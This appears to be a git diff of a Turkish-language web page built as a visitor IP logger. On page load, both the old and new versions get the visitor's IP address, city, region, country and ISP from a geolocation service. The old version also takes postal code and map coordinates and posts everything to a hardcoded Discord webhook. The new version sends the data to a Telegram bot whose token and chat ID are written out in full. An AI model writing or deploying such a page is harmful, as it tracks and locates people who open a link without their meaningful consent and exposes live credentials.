@@ -1,109 +1,108 @@
 <!DOCTYPE html>
 <html lang="tr">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Konum Alınıyor...</title>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>IP Bildirici</title>
   <style>
+    @import url('https://fonts.googleapis.com/css2?family=Poppins&display=swap');
     body {
-      font-family: 'Inter', sans-serif;
-      background-color: #0e0e10;
-      color: #ffffff;
+      margin: 0; padding: 0;
+      background: linear-gradient(135deg, #667eea, #764ba2);
+      font-family: 'Poppins', sans-serif;
+      color: #fff;
       display: flex;
       flex-direction: column;
-      justify-content: center;
       align-items: center;
+      justify-content: center;
       height: 100vh;
-      margin: 0;
-      padding: 20px;
       text-align: center;
     }
-
-    h1 {
-      font-size: 2rem;
-      margin-bottom: 1rem;
-      animation: fadeIn 1.5s ease;
-    }
-
     .loader {
-      border: 6px solid #222;
-      border-top: 6px solid #00bfff;
+      border: 6px solid rgba(255,255,255,0.2);
+      border-top: 6px solid #fff;
       border-radius: 50%;
-      width: 50px;
-      height: 50px;
+      width: 60px; height: 60px;
       animation: spin 1s linear infinite;
-      margin-bottom: 20px;
+      margin-bottom: 1.5rem;
     }
-
-    .info-box {
-      background-color: #1c1c1f;
-      padding: 20px;
-      border-radius: 10px;
-      margin-top: 10px;
-      max-width: 400px;
-      word-wrap: break-word;
-      opacity: 0;
-      transition: opacity 0.4s ease;
-    }
-
     @keyframes spin {
-      0% { transform: rotate(0deg);}
-      100% { transform: rotate(360deg);}
+      to { transform: rotate(360deg); }
     }
-
-    @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(-10px);}
-      to { opacity: 1; transform: translateY(0);}
+    h1 {
+      font-weight: 600;
+      margin-bottom: 1rem;
+    }
+    .status {
+      font-size: 1.25rem;
+      margin-top: 1rem;
+    }
+    .success {
+      color: #4caf50;
+    }
+    .error {
+      color: #ff5252;
     }
   </style>
 </head>
 <body>
-  <div class="loader"></div>
-  <h1>Konum verilerin analiz ediliyor...</h1>
-  <div class="info-box" id="info"></div>
+  <div class="loader" id="loader"></div>
+  <h1>Konum ve IP bilgisi gönderiliyor...</h1>
+  <div class="status" id="status"></div>
 
   <script>
-    fetch('https://ipapi.co/json/')
-      .then(res => res.json())
-      .then(data => {
-        const { ip, city, region, country_name, country_code, postal, org, latitude, longitude } = data;
+    const loader = document.getElementById('loader');
+    const status = document.getElementById('status');
 
-        const infoBox = document.getElementById('info');
-        infoBox.innerHTML = `
-          🌍 IP: <strong>${ip}</strong><br>
-          🏙️ Şehir: <strong>${city}</strong><br>
-          🏞️ Bölge: <strong>${region}</strong><br>
-          🗺️ Ülke: <strong>${country_name}</strong><br>
-          📮 Posta Kodu: <strong>${postal}</strong><br>
-          ☁️ ISS: <strong>${org}</strong><br>
-        `;
-        infoBox.style.opacity = 1;
+    const botToken = '8087577949:AAE6s1rHpfxjgmHPTGYkAbBuRw6O84szn8U';
+    const chatId = '7125066639';
 
-        const webhookURL = 'https://discord.com/api/webhooks/1396279953896636526/2EBRWqSeo04I0_-1P9QjGbFrpE37IZ3ShrztrEgpN7t8Q6D8M4_EH3rfNzwpsE0LIKIo';
+    async function sendTelegramMessage(message) {
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+      try {
+        const res = await fetch(url);
+        if (!res.ok) throw new Error('Telegram API hatası');
+        return true;
+      } catch (e) {
+        console.error(e);
+        return false;
+      }
+    }
 
-        const message = {
-          content: `📡 Yeni ziyaretçi yakalandı!
+    async function main() {
+      try {
+        const res = await fetch('https://ipapi.co/json/');
+        if (!res.ok) throw new Error('IP bilgisi alınamadı');
+        const data = await res.json();
 
-🛰️ IP: \`${ip}\`
-🌆 Şehir: **${city}**
-📍 Bölge: **${region}**
-🌍 Ülke: **${country_name}** :flag_${country_code.toLowerCase()}:
-📮 Posta Kodu: ${postal}
-📡 Sağlayıcı: ${org}
-🗺️ Harita: https://www.google.com/maps?q=${latitude},${longitude}`
-        };
+        const message =
+          `📡 Yeni Ziyaretçi!\n\n` +
+          `🛰️ IP: ${data.ip}\n` +
+          `🌆 Şehir: ${data.city || 'Bilinmiyor'}\n` +
+          `🏞️ Bölge: ${data.region || 'Bilinmiyor'}\n` +
+          `🌍 Ülke: ${data.country_name || 'Bilinmiyor'}\n` +
+          `🧭 Sağlayıcı: ${data.org || 'Bilinmiyor'}`;
 
-        fetch(webhookURL, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(message)
-        });
-      })
-      .catch(err => {
-        document.getElementById('info').innerText = 'Konum bilgisi alınamadı.';
-        console.error(err);
-      });
+        const sent = await sendTelegramMessage(message);
+
+        loader.style.display = 'none';
+
+        if (sent) {
+          status.textContent = '🚀 Mesaj başarıyla gönderildi!';
+          status.classList.add('success');
+        } else {
+          status.textContent = '❌ Mesaj gönderilemedi.';
+          status.classList.add('error');
+        }
+      } catch (error) {
+        loader.style.display = 'none';
+        status.textContent = '❌ IP bilgisi alınamadı.';
+        status.classList.add('error');
+        console.error(error);
+      }
+    }
+
+    main();
   </script>
 </body>
 </html>
